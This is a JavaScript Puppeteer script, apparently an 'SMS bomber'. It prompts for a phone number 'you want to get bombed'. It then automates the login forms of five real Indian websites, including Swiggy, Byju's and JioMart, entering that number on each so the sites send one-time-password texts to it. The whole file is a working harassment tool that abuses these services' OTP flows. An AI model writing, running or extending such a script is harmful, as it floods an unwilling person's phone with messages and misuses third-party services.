const puppeteer= require('puppeteer')
let page
// let phn = process.argv[2]
const prompt = require("prompt-sync")();//used this npm lib for input 

const phn = prompt("What is phn no. you want to get bombed? ");
let loginButton=[".no-separator.nav-spacing .primary-login-btn",".x4bK8",".chakra-button.css-1msthrb",".HomeDesktopContent__LoginButton-d8hp0o-11.bGMwjd","body > div.page-wrapper > div.top-section > header > div > div.login.col-lg-2.p-0 > div > a:nth-child(1)"]
let link=["https://byjus.com/","https://www.swiggy.com/","https://nados.io/","https://www.faasos.com/?gclid=Cj0KCQjw5-WRBhCKARIsAAId9FlL1FJ-peJIU5EfSepncKuHECYRgUUi1DOsZMTWDtGmfFxcyrlVTHwaAnKsEALw_wcB","https://www.jiomart.com/"]
let typePhn=["input[type='tel']","._381fS[type='tel']",".chakra-numberinput.css-lp00hj input[name='phone']","input[type='number']","input[formcontrolname='loginfirst_mobileno']"]
let click=[".nextButtonLanding",".a-ayg",".css-1mor89b .chakra-button.css-1y7wf8p",".Button-sc-1wgtjk0-0.gHnthx","#app > main > div > app-login > div.custloginmain > div > div.innermain.row.m-0 > div.col-lg-6.rightcol.p-0 > div > div.innercol > form > div.form-check.arrowbtn.text-center.p-0 > button.btn-signpass.arrowbtn"]



    async function sms() {
        let browserWillBeLaunchedPromise=  puppeteer.launch({
            headless : false ,
            defaultViewport : null,
            args:['--start-maximized']  
        })
for (let i=0;i<loginButton.length;i++){
    await browserWillBeLaunchedPromise.then(function (browserInstance){
    let newTabPromise= browserInstance.newPage()
    return newTabPromise
}).then(function(newTab){
    page= newTab
    let pageWillBeOpenedPromise= newTab.goto(link[i])
    return pageWillBeOpenedPromise
})
.then(function(){
  // let path=link[i]+page.$(loginButton[i]).attr("href");
  let loginButtonPressedPromise= page.click(loginButton[i],{delay:100})
  return loginButtonPressedPromise
})
.then(function(){
    let typePhoneNumberPromise= waitAndType(typePhn[i],page,phn)
    return typePhoneNumberPromise
}).then(function(){
    // let forgotClickedPromise= waitAndClick(click[i],page)
    let forgotClickedPromise= waitAndClick(click[i],page)
    return forgotClickedPromise
})
// .then(setTimeout(async function(){
//    let pageWillBeClosedPromise= await page.close()
//    return pageWillBeClosedPromise
// },10000))

}
}
sms()
function waitAndType(selector, currentPage,phn) {
  return  new Promise(function (resolve, reject) {
      let waitForModelPromise = currentPage.waitForSelector(selector)
      waitForModelPromise.then(function () {
          let clickModelPromise = currentPage.type(selector,phn, { delay: 250})
          return clickModelPromise
      }).then(function () {
          resolve()
      }).catch(function () {
          reject()
      })
  })
}


function waitAndClick(selector, currentPage) {
    return new Promise(function (resolve, reject) {
        let waitForModelPromise = currentPage.waitForSelector(selector)
        waitForModelPromise.then(function () {
            let clickModelPromise = currentPage.click(selector, { delay: 4000 })
            return clickModelPromise
        }).then(function () {
            resolve()
        }).catch(function () {
            reject()
        })
    })
}